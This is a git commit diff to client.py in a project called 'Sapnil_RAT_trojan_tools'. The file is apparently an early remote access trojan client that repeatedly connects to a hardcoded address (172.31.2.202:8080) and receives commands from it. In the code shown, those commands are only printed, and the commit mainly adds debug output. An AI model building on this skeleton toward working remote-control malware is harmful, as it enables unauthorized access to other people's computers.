ce038be8ee6b9f6fa2437457f45793d3d709af1d
rmisys123 <sapnil123@yahoo.com>
2021-09-28 15:47:26 +0600

    change on client.py

--- Sapnil_RAT_trojan_tools/sapnilRAT/client.py
+++ Sapnil_RAT_trojan_tools/sapnilRAT/client.py
@@ -1,6 +1,6 @@
 import socket, os
 import threading        
-import numpy, sys
+import sys
 
 def connect(ip_address, port):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -8,7 +8,8 @@ def connect(ip_address, port):
  
     while True: 
         command =  s.recv(1024*1024).decode()
-        
+        #con_str=command.decode()
+        print("the command is ",command)
         
         if 'kill' in command:
             print('kill process')
@@ -19,24 +20,26 @@ def connect(ip_address, port):
             return 2
         
         else:
-            print(command.decode())
+            print(command)
        
             
 
 def run():
-    ip_address='127.0.0.1'
+    ip_address='172.31.2.202'
     port=8080
+    #print("thread stared")
     while True:
         try:
             if connect(ip_address, port) == 1:
                 return True
             if connect(ip_address, port) == 2:
                 return True
-        except:
-            print("Checking", ip_address, "for a connection....")
+        except Exception as e:
+            print("Checking", ip_address, "for a connection....",str(e))
             return False
 
 def main ():
+    #print("program stared")
     threading.Thread().start()
     while True: 
         stop = run()
